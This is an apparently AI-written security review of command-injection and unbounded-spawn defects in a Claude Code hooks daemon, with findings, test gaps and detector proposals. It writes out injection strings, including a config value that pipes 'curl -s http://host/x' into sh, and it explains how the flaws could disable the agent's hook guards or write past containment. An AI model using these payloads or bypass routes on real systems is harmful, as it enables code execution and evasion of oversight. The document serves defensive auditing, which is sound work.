# Security review — D-EXEC — full sweep (run 2026-001)

**Check**: `D-EXEC` — "New or changed process spawns: `shell=True`, a
string-built command line, a spawn that does not go through
`utils.git_repo.run_git` where it should."

**Interval**: full tree at `5d59f7ff` (root `74b0989c` → HEAD). Reviewed the
CURRENT tree, not a diff.

**Scope covered**: `src/claude_code_hooks_daemon/` (every `subprocess`
spawner call site, resolved by AST, plus the generated-shell emitters),
`scripts/` (Python and shell), `bin/`, and the two tracked hook-transport
shell files (`.claude/init.sh`, `init.sh`) plus the deployed forwarders under
`.claude/hooks/`. Tests were read only where a spawn shape would be copied
into production code; none were.

**Answerability**: the check was fully answerable. Every spawn site was
readable and every one was inspected. Nothing was skipped for lack of a tool
or a path.

**Result**: 6 findings. `shell=True` appears nowhere in the tree outside
documentation strings — that half of the check is clean. Every finding is
either a string-built command line or a spawn missing the properties the
project's own runner exists to guarantee.

---

## Inventory (what was actually looked at)

`subprocess.{run,Popen,call,check_call,check_output}` call sites, by AST, in
`src/` and `scripts/`: 24. Of these, exactly one spawns `git` and it is
`utils/git_repo.py:122` — the bounded runner. Four more spawn `git` from
`scripts/qa/`, which the existing gate does not cover (see F6).

`shell=True`: 0 real occurrences. `qa/runner.py:142` passes `shell=False`
explicitly. The remaining textual hits are the `security_antipattern`
handler's own rule text and the Python security strategy's pattern table.

Spawns with **no** `timeout=`: 8 (listed under F5/F6; two of those are bounded
by a later `communicate(timeout=…)` and are fine).

Shell command construction: `eval` appears once in an executed position
(`scripts/run-qa-runner.sh:83`); `python3 -c "…"` with shell interpolation
into the interpreter payload appears once (`.claude/init.sh:1423`, mirrored in
the tracked client template `init.sh:1423`).

---

## F1 — Shell interpolation into the hook transport's Python payload

**Citation**: `.claude/init.sh:1423` (identical at `init.sh:1423`, the tracked
client-deployed template).

```bash
    python3 -c "
...
socket_path = '$SOCKET_PATH'
...
" "$event_name" "$response_mode" <&3
```

The `python3 -c` body is **double-quoted**, so bash expands `$SOCKET_PATH`
into the Python *source* before the interpreter ever sees it, inside a
single-quoted Python string literal.

**What it allows**: a single `'` anywhere in `SOCKET_PATH` terminates the
Python literal and everything after it is parsed as Python. `SOCKET_PATH` is
assigned at `.claude/init.sh:611`:

```bash
SOCKET_PATH="${CLAUDE_HOOKS_SOCKET_PATH:-$_untracked_dir/daemon${_hostname_suffix}.sock}"
```

Three independent sources feed it, and none is validated or quoted:

1. `CLAUDE_HOOKS_SOCKET_PATH` — an environment variable, documented at
   `.claude/init.sh:609` as the testing override.
2. `_untracked_dir` = `"${HOOKS_DAEMON_ROOT_DIR}/untracked"`
   (`.claude/init.sh:588`), where `HOOKS_DAEMON_ROOT_DIR` is `source`d from
   `$PROJECT_PATH/.claude/hooks-daemon.env` (`.claude/init.sh:333`) and
   otherwise defaults to the checkout path (`.claude/init.sh:337`).
3. `_hostname_suffix` from `$HOSTNAME` via `_get_hostname_suffix`
   (`.claude/init.sh:477-498`), which lowercases and replaces spaces — a
   quote survives both passes.
4. `_discovered_path=$(cat "$_discovery_file")` (`.claude/init.sh:612`), the
   contents of `untracked/daemon-<host>.socket-path`, re-assigned into
   `SOCKET_PATH` at line 615. Narrowed by an `-S` test, so this route needs
   an actual socket at a quote-bearing path.

The **realistic** trigger is not an attacker: it is an apostrophe in a
checkout path or a hostname. On such a machine `python3 -c` dies with a
`SyntaxError` before opening the socket, `send_request_stdin` returns
non-zero, the forwarder exits non-zero with a traceback on stderr and
**nothing on stdout** — so Claude Code treats it as a non-blocking hook error
and runs the tool. Every `PreToolUse` guard in the daemon is inert, on every
event, and the diagnostic the operator sees is a Python syntax error about a
socket path.

The **deliberate** version is arbitrary Python execution in the hook
forwarder, as the user, on every hook event, from an environment variable.

**The class**: *a value the shell expands into the SOURCE TEXT of another
interpreter, rather than passing as an argument.* A member of the class is any
`python3 -c "…$VAR…"`, `perl -e "…"`, `awk "…$VAR…"` or `sh -c "…$VAR…"` where
the body is double-quoted (or unquoted) and contains an expansion. The test is
mechanical: does the interpreter's program text contain a `$` or a backtick
that bash will expand? If yes, it is a member, regardless of how trustworthy
the value looks.

**Why the test suite does not catch it**: every test runs with a socket path
the test harness itself chose, and those are `tmp_path`-derived — always
shell-safe. The suite has no fixture whose path contains a quote, and
`test_emit_hook_error_jqless.py` / `test_dogfooding_hook_scripts.py` assert on
the *output* of a working transport, not on the shape of the command that
produced it. `audit_shell.py` scans these files but only for error-hiding
(`2>/dev/null || true`) and `$0`-relative re-exec after a bootstrap stanza;
it has no rule about interpolation into an interpreter body. Nothing in
`scripts/qa/` parses shell for this shape at all.

**Detector hypothesis**: a shell-source rule, added to `audit_shell.py`
(which already owns the scan/JSON/marker plumbing for `.sh`/`.bash`): flag any
command whose argv contains a `-c`/`-e` code flag for a known interpreter
(`python`, `python3`, `perl`, `ruby`, `node`, `sh`, `bash`, `awk`) where the
following word is a double-quoted or unquoted string containing `$` or a
backtick. Report the expansion, not the whole body.

*Likely false positives*: a deliberate one-shot where the value is a literal
the script itself just built from a constant (e.g. `python3 -c "print($N)"`
with `N=3` two lines up) — genuinely safe but indistinguishable without
dataflow. Also `bash -c "$cmd"` idioms in test harnesses. I would expect a
handful across this repo; the marker convention `audit_shell.py` already has
(`# shell-audit: allow -- <reason>`) absorbs them, and the rule stays cheap.
It should NOT fire on single-quoted bodies (`python3 -c 'print(1)'`), which is
the whole remediation.

**Confidence**: high that the defect is present and that the syntax-error
outcome is real. Medium on the exploitability framing — an attacker who can
set `CLAUDE_HOOKS_SOCKET_PATH` in the agent's environment usually has other
routes. What would settle it: run a forwarder with
`CLAUDE_HOOKS_SOCKET_PATH="/tmp/a'+__import__('os').system('id')+'b.sock"` and
observe whether `id` runs. I did not execute this — I am read-only and this
would spawn a process.

**Note on remediation shape** (not my deliverable, but it bears on whether
the class is well-defined): the same file already does it correctly **twice**.
Line 1469 passes `"$event_name" "$response_mode"` as argv and the body reads
them via `sys.argv`; `forward_stop_event` (`.claude/init.sh:1539-1553`) passes
`"$response_file"` as argv for exactly the same reason. The socket path is the
one value done the other way.

---

## F2 — `eval` on a command line concatenated from positional arguments

**Citation**: `scripts/run-qa-runner.sh:63-83`.

```bash
PROJECT_ROOT="${1:-.}"
TOOLS="${2:-ruff,mypy,black,pytest}"
OUTPUT_DIR="${4:-}"
...
CMD="$PYTHON_BIN -m claude_code_hooks_daemon.qa.runner"
CMD="$CMD --project-root $PROJECT_ROOT"
CMD="$CMD --tools $TOOLS"
...
if eval "$CMD"; then
```

**What it allows**: every one of `$1`, `$2`, `$4` is concatenated **unquoted**
into a string that is then `eval`'d. `./scripts/run-qa-runner.sh '$(id > /tmp/pwned)'`
executes `id`. Short of that, the ordinary failure is just as certain: a
project root containing a space is split into two arguments and the runner is
invoked against the wrong path, or with a stray argument argparse rejects.

This is the documented invocation. `docs/QA.md:58` says
`./scripts/run-qa-runner.sh <project-root> "ruff,mypy"` and
`src/claude_code_hooks_daemon/qa/CLAUDE.md:18` repeats it — so the path an
agent or operator types goes straight into an `eval`.

**The class**: *a command line assembled by string concatenation in shell and
then executed via `eval` (or an unquoted expansion in command position).* The
boundary: if the words of the command are built by appending to a variable
rather than pushed onto an array, and the variable is later `eval`'d or
expanded unquoted, it is a member. An array (`cmd=(…); "${cmd[@]}"`) is not.

**Why the test suite does not catch it**: there is no test that invokes
`run-qa-runner.sh`. It is a developer entry point, exercised by hand. The one
scanner that reads it, `audit_shell.py`, has no `eval` rule. `shellcheck` runs
over `scripts/` (`scripts/qa/run_shell_check.sh`) and does flag SC2086-class
issues, but the concatenation here is into a variable rather than directly
into a command position, and the `eval "$CMD"` form is SC2086-clean because
`$CMD` *is* quoted — the danger is `eval` itself, which shellcheck does not
warn about by default.

**Detector hypothesis**: same `audit_shell.py` rule file. Flag `eval` applied
to any variable, and separately flag a variable that is built by
`VAR="$VAR …$OTHER…"` accumulation and later reaches a command position. The
first half alone catches this and is nearly free.

*Likely false positives*: `eval "$(some-tool shellenv)"` (direnv/pyenv-style
environment activation) is a legitimate idiom and would fire. I expect this
rule to have a low absolute count in this repo (one hit today) but to be
noisy in a client project that activates a toolchain. It is worth shipping as
a rule *with* the marker escape hatch rather than as a silent suggestion.

**Confidence**: high. The shape is unambiguous and the file is short enough to
read whole.

*Incidental, not D-EXEC*: `EXIT_CODE=$?` at line 84 and 89 captures the exit
status of the `if`, not of `eval`, so the "exit code: N" messages are wrong.
Noted because it sits in the same three lines; it is not part of this check.

---

## F3 — Generated bash interpolates unescaped config and path values

**Citation**: `src/claude_code_hooks_daemon/install/forwarder_generator.py:246-263`.

```python
    lines = [
        _GUARD_HEADER,
        'if [[ "${1:-}" != "--no-relay" && '
        f'"${{BASH_SOURCE[0]}}" == "{deployed_hooks_dir(project_root)}"* ]]; then\n',
        f'    _rl_dir="{untracked_dir}"\n',
    ]
    ...
    lines.append(f'    _rl_bin="${{HOOKS_DAEMON_RELAY_BINARY:-{relay_binary}}}"\n')
```

and `append_nc_socket_arg` at line 544:

```python
        rendered = " ".join(f'"{arg}"' for arg in [*kept, baked_events_dir])
```

**What it allows**: `relay_binary` comes from `transport.relay_binary`
(`forwarder_generator.py:243`), declared at `config/models.py:1483` as a bare
`str | None` with **no validator** — not absolute-path-checked, not
metacharacter-checked, and explicitly exempted from the repository-relative
rule. A project's `.claude/hooks-daemon.yaml` carrying

```yaml
daemon:
  transport:
    relay_binary: '/tmp/x}"; curl -s http://host/x | sh; :"'
```

emits a forwarder line that closes the assignment and runs a second command —
in a file that executes on **every hook event**, before the daemon is
consulted and before any handler can object. `untracked_dir` and
`deployed_hooks_dir(project_root)` carry the same exposure from a checkout
path containing `"`, `$` or a backtick (all legal on Linux), where the outcome
is a forwarder that does not parse rather than one that runs something extra.

**What makes this a finding rather than a judgement call**: the escaper
already exists, **in this module**, twenty lines above the first unescaped
interpolation. `_escape_for_double_quotes` (line 90) is applied at line 128 to
`meta.daemon_down_stdout`, and its docstring states the reasoning outright:

> The catalogue is an internal constant, so nothing here is hostile input. It
> is escaped anyway because the failure would be silent and remote […] one
> gaining a backtick or `$` emits a forwarder that runs a command substitution
> every time the daemon is down.

That argument applies with strictly more force to a value read from a YAML
file in the working tree than to a module constant, and it was not applied.

**The class**: *interpolating a value into generated shell source without
escaping it for the quoting context it lands in.* A member is any f-string (or
`%`/`.format`) that places a runtime value inside a `"`-delimited span of
emitted shell. The boundary is the destination language, not the value's
provenance: "this value is trusted" is not an exemption, because the same
escaper's own docstring rejects that reasoning.

**Why the test suite does not catch it**: the forwarder-generation tests
(`tests/integration/test_hooks_deploy_*.py`, and the generator's unit tests)
build forwarders under `tmp_path` with default config, so `relay_binary` is
`None` and every path is shell-safe. The generated text is asserted against
expected *content*, never parsed by bash, so an emitted file that does not
parse would still pass a substring assertion. There is no test that supplies a
`relay_binary` containing a shell metacharacter — and `model_config = ConfigDict(extra="forbid")` gives a false sense of coverage: it validates the
*key set*, never the value.

**Detector hypothesis**: a Python AST rule over the modules that emit shell —
`install/forwarder_generator.py` and any sibling that writes a `.sh`. Flag a
`JoinedStr` (f-string) whose literal parts contain a shell quote character
(`"` or `'`) and whose `FormattedValue` parts are not wrapped in a call to a
known escaper (`_escape_for_double_quotes`, `shlex.quote`). Equivalently:
inside a string being built as shell, every interpolation must pass through an
escaper.

*Likely false positives*: f-strings that build shell *comments*
(`f'# generated for {project_root}\n'`), which are harmless and would fire;
and f-strings that build a path for a Python API that merely happens to
contain a quote in an adjacent literal. In this module I count roughly a dozen
interpolations of which about five are genuine, so the rule is around 40%
precision as stated — reportable, but it needs the comment-line exclusion to
be worth enabling. I am flagging it as moderately noisy rather than clean.

**Confidence**: high that the values are unescaped and that `relay_binary` has
no validator — both read directly off the source. Medium on how much a
malicious `.claude/hooks-daemon.yaml` should count as in-scope: a config file
in the tree can already disable handlers, so the question is whether
"turn a guard off" and "run a command" are the same severity. I do not think
they are, which is why this is F3 and not F1. What would settle it: a stated
position in `CLAUDE/Security/` on whether the project's own config file is
trusted input. I found no such statement.

---

## F4 — Linter argv built by whitespace-splitting a string containing the file path

**Citations**:
`src/claude_code_hooks_daemon/handlers/post_tool_use/lint_on_edit.py:474-476`
and
`src/claude_code_hooks_daemon/handlers/pre_tool_use/staged_lint_gate.py:288-289`.

```python
        command = command_template.replace(_FILE_PLACEHOLDER, effective_path)
        # Split command into list for subprocess
        # SECURITY: These are trusted lint tools defined in strategy constants
        command_parts = command.split()
```

```python
        command = strategy.default_lint_command.replace("{file}", file_path)
        parts = command.split()
```

The comment is accurate about the *tool* and silent about the *path*, which is
where the problem is.

**What it allows**: the templates are things like `bash -n {file}`
(`shell_strategy.py:11`), `ruff check {file}` (`python_strategy.py:14`),
`php -l {file}` (`php_strategy.py:11`), `rustc {crate_framing} {file}`
(`rust_strategy.py:62`), `go vet {file}` (`go_strategy.py:11`). Substituting a
path and then splitting on whitespace means **every space in the path becomes
an argv boundary**.

Two concrete outcomes:

1. *Argument injection.* A filename is an arbitrary byte string. Writing
   `untracked/scratch/a.rs -o /home/user/.bashrc` (a legal filename) makes
   `lint_on_edit` spawn `rustc … /…/a.rs -o /home/user/.bashrc`, so the linter
   writes a file the agent could not have written directly — outside the
   repository, past `project_containment`, which judges the *Write* tool call
   and never sees this spawn. The file must exist for linting to run
   (`_is_lintable` → `path_exists`, `lint_on_edit.py:269`), but creating it is
   the same Write the handler is reacting to.
2. *Ordinary breakage.* A repository checked out under a path containing a
   space (`/Users/me/My Projects/app`) makes every lint spawn receive a
   truncated path, the linter exits non-zero because the file does not exist,
   and `lint_on_edit` returns `Decision.DENY` — a legitimate write denied,
   with lint output about a file nobody named.

`staged_lint_gate` takes its paths from the git index rather than from hook
input, which narrows route 1 to a committed filename, but route 2 is identical.

**The class**: *building argv by splitting a string that contains a value from
outside the program.* Membership test: if any argv element is produced by
`.split()` (or `shlex.split`) on a string that had a runtime value substituted
into it, it is a member. The correct shape — the one the same handler already
reaches for one line later — is a list with the value as its own element:
`[*template_words, file_path]`.

**Why the test suite does not catch it**: every lint test writes its fixture
to a `tmp_path`-derived filename, and pytest's `tmp_path` never contains a
space. The tests that assert on the spawned command assert on
`command_parts[0]` (executable resolution, Plan 00296) or monkeypatch
`subprocess.run` and check the *tool name*, not the argv tail. No test lints a
file whose path contains a space, so the split is never observed doing
anything. The handler's own inline `# SECURITY:` comment also reads as a
settled question, which is the sort of thing that stops the next reader
looking.

**Detector hypothesis**: a Python AST rule — flag a call to a `subprocess`
spawner whose argv expression is (or transitively derives from) a `.split()`
call. Concretely: if the argv node is `Name` bound to `X.split()` in the same
function, or is `X.split()` directly, report it.

*Likely false positives*: splitting a genuinely static module constant
(`_CMD = "ruff check".split()`) is safe and would fire; so would a test helper
that splits a hard-coded command string. I would expect a low single-digit
count across this repo. Precision could be raised by only firing when the
split string is the result of a `.replace()`/f-string/`%` — that narrowing
catches both sites here and drops the constant case, and I would ship it that
way.

**Confidence**: high on the mechanism and on outcome 2. Medium on outcome 1 —
I did not verify that `rustc`'s argument parser accepts `-o` after the input
file in the exact form `rust_strategy` emits, nor that `ruff check … --fix`
is reachable (the extended Python command is `ruff check {file}`, and `--fix`
after the path would be accepted by clap). What would settle it: one execution
each, which I did not run.

---

## F5 — Two unbounded spawns in `src/`

**Citations**:

- `src/claude_code_hooks_daemon/daemon/background_harvester.py:275` —
  `subprocess.run(["ps", "-eo", PS_FORMAT], capture_output=True, text=True, check=True)`.
  No `timeout`. Reached only from `cli.py:3693` (`harvest-background`), not
  from hook dispatch.
- `src/claude_code_hooks_daemon/daemon/cli.py:3185` —
  `subprocess.run(["gh", "run", "list", "--branch", branch, …], check=True)`.
  No `timeout`, and this one makes a **network** call.

**What it allows**: `gh run list` against a stalled network or a hung
credential helper blocks `release-slate` forever. The command's whole purpose
(`cli.py:3172-3177`) is to produce an exit code the release skill consumes,
where `1` deliberately means "could not determine" — and a hang produces
neither `0` nor `1`, it produces nothing. `ps` is lower stakes but
`check=True` with no timeout means a wedged `/proc` walk takes the
`harvest-background` command with it.

Both are argv-form with fixed, non-interpolated arguments, so neither is an
injection. The missing property is the *other* one `run_git` exists to
guarantee.

**The class**: *a spawn of an external process with no time bound.* The
boundary is simple and needs no judgement: `subprocess.run`/`Popen` without
`timeout=` (or, for `Popen`, without a `communicate(timeout=…)` on every
path). `install/transport_verify.py:135` is a `Popen` with no `timeout=` and
is **not** a member — line 148 bounds it with `communicate(timeout=…)` and
kills the child on expiry.

**Why the test suite does not catch it**: `run_ps` is monkeypatched in every
test that reaches it (`tests/unit/daemon/test_cli_harvest_background.py:37`
and five more), so the real spawn never runs under test. `_gh_ci_lookup` is
likewise stubbed. `test_git_spawns_are_bounded.py` enforces boundedness only
for argv beginning with the literal `"git"` — its own docstring says so — so
`ps` and `gh` are outside it by construction.

**Detector hypothesis**: widen `test_git_spawns_are_bounded.py` from "argv
starts with `git`" to "any `subprocess` spawner call in `src/` lacking a
`timeout` keyword", keeping the existing `_EXEMPT` mechanism (which already
requires a written reason per entry) for the `Popen`+`communicate` shape.

*Likely false positives*: exactly the `Popen`/`communicate` split above, and
a spawn whose timeout is supplied by a wrapper. Both are few and both are
legitimately exemptions-with-a-reason rather than rule changes. This rule is
high precision — I count two real hits and one exemption across `src/`.

**Confidence**: high. Produced by AST over the whole tree, then each hit read
in context.

---

## F6 — Four git spawns outside `run_git`, in `scripts/qa/`

**Citations**:

| Site                                       | argv                                                | timeout | `GIT_OPTIONAL_LOCKS=0` |
| ------------------------------------------ | --------------------------------------------------- | ------- | ---------------------- |
| `scripts/qa/check_sensitive_content.py:85` | `git -C <root> ls-files -z`                         | no      | no                     |
| `scripts/qa/check_git_history.py:123`      | `git -C <repo> <args>` (`rev-parse`, `rev-list`, …) | no      | no                     |
| `scripts/qa/check_repo_hygiene.py:447`     | `git -C <root> ls-files -z`                         | yes     | no                     |
| `scripts/qa/check_repo_hygiene.py:489`     | `git -C <root> ls-files -z --others --ignored …`    | yes     | no                     |
| `scripts/qa/check_british_english.py:187`  | `git -C <root> ls-files -z`                         | yes     | no                     |

**What it allows**: none of these declines git's optional index lock, so each
contends with the agent's own working tree for `.git/index.lock`; two carry no
time bound at all, and `check_sensitive_content.py` additionally uses
`check=True`, so a wedged git aborts the QA run with a traceback rather than a
verdict.

**This is known ground, and I am reporting it anyway.** The gate's docstring
(`tests/integration/test_git_spawns_are_bounded.py`) states its scope as
`src/` only and says outright:

> `scripts/qa/` also spawns git directly and untimed; none of those calls
> touches the index today (`log`, `for-each-ref`), but the guard would not
> notice if one started to.

Two things have moved since that was written, which is why it is worth a line
rather than silence. The inventory is no longer `log` and `for-each-ref` — it
is five sites, four of them `ls-files`, across four files. And the claim
"none touches the index" is a statement about a moment. `ls-files` reads the
index without writing it, so the claim still holds today; the point is that
nothing establishes it, and the file that records the exemption is the same
file that says nothing would notice.

**The class**: as the check states — a git spawn that does not go through
`utils.git_repo.run_git` where it should. The "where it should" is doing real
work here: `scripts/qa/` is standalone tooling that deliberately does not
import the daemon package, so a literal `run_git` call is not obviously
available to it.

**Why the test suite does not catch it**: by design — `_SRC_ROOT` at
`test_git_spawns_are_bounded.py` is `src/claude_code_hooks_daemon`, and
`_direct_git_spawns` walks only that. The scanner is otherwise capable; it is
pointed elsewhere.

**Detector hypothesis**: point the existing scanner at `scripts/` as a second
root, with a relaxed rule for that root — not "must use `run_git`" (which
these files cannot easily import) but "must pass `timeout=` and must set
`GIT_OPTIONAL_LOCKS=0` in `env`". The scanner already resolves module-level
string and sequence constants, so `[_GIT_BINARY, "-C", …]` in
`check_repo_hygiene.py` and `check_british_english.py` is already matched.

*Likely false positives*: near zero for the timeout half. The
`GIT_OPTIONAL_LOCKS` half would fire on a spawn that sets the variable via a
helper rather than inline, which none of these do today.

**Confidence**: high on the facts. Low-to-medium on whether this should be
*acted* on versus recorded — it is a documented, reasoned exemption, and the
honest finding is that the exemption's justification has drifted from five
sites to a sentence naming two commands that are no longer the ones there.

---

## What I did not find

- **No `shell=True`** anywhere executable, in `src/`, `scripts/` or `bin/`.
- **No git spawn in `src/`** outside `utils/git_repo.py`. The gate holds, and
  I re-ran its scanner's logic independently by AST rather than trusting the
  test's verdict.
- **`remote_docs/fetchers.py` is clean**, and I want to say so explicitly
  because it looks like a finding and is not. `agent_browser_fetch`
  (line 210) passes a user-supplied URL as an argv word to
  `agent-browser read <url>` with no validation of its own, while its sibling
  `https_fetch` (line 98) validates the scheme and says in its docstring that
  this makes `file:` "impossible by construction rather than by convention".
  The asymmetry is real but not exploitable: every route to a `fetch_fn`
  passes through `capture()` (`remote_docs/capture.py:214`), which calls
  `_require_https` **before** `fetch_fn(url)`, and both CLI callers
  (`cli.py:6267`, `cli.py:6366`) go through `write_capture`/`refresh` →
  `capture`. A URL reaching the spawn therefore always starts `https://`, so
  it can be neither a `file:` URL nor a leading-`-` argument. The defence is
  in the caller rather than at the spawn, which is weaker than the docstring's
  claim about the other path — but it is present, so this is not a finding.
- **`install/transport_verify.py:135`** — a `Popen` with no `timeout=`, which
  an AST scan flags. It is bounded by `communicate(timeout=PROBE_TIMEOUT_SECONDS)`
  at line 148 and kills + reaps the child on expiry. Not a finding.
- **`scripts/release/build_bootstrap_checksums.sh:57`** — `$sha256_cmd`
  unquoted in command position. The word-splitting is deliberate (the value is
  either `sha256sum` or `shasum -a 256`, chosen by an `if` twenty lines up)
  and the value never comes from input. Not a finding.
- **`scripts/debug_info.py:231`** — `run_command` has no timeout. It is a
  hand-run diagnostic tool, argv-form, and every caller passes a literal list.
  Worth a line in the F5 detector's output if that rule is ever extended to
  `scripts/`; not worth a finding of its own.

## Ranking, if the caller needs one

F1 and F2 are the two where a string is handed to an interpreter and the
interpreter's behaviour changes. F3 is the same shape one remove away
(generated source rather than an immediate spawn) and is the one with the
cleanest remediation, because the escaper it needs is already in the file.
F4 is the one most likely to fire by accident on a real machine. F5 and F6 are
missing properties rather than injections.

Three of the six (F1, F2, F4) would be found by rules in files that already
exist and are already wired into `run_all.sh` — `audit_shell.py` for the two
shell findings, a new AST checker alongside `check_magic_values.py` for F4.
That matters for the register's stated obligation: each names a Detector in
`scripts/qa/`, not a regression test.
